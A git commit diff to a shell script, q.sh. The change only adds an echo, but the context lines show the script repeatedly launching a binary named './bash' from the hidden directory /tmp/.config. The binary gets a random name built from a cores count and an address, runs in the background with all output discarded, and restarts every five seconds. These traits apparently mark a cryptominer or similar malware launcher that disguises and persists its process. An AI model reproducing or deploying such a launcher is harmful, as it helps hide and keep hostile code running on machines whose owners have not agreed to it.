a9f63f13a7abc227c05b16351dc76e26191a53b3
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-30 15:23:52 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -59,7 +59,7 @@ if [ "$mode" == "0" ]; then
   name=`RandString 2 c${cores}_${addr}`;
   bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done" >/dev/null 2>&1 &
 else
-  while true; do cd /tmp/.config; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
+  while true; do cd /tmp/.config; name=`RandString 2 d${cores}_${addr}`; echo ${name}; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
 fi
 echo "##8"
 
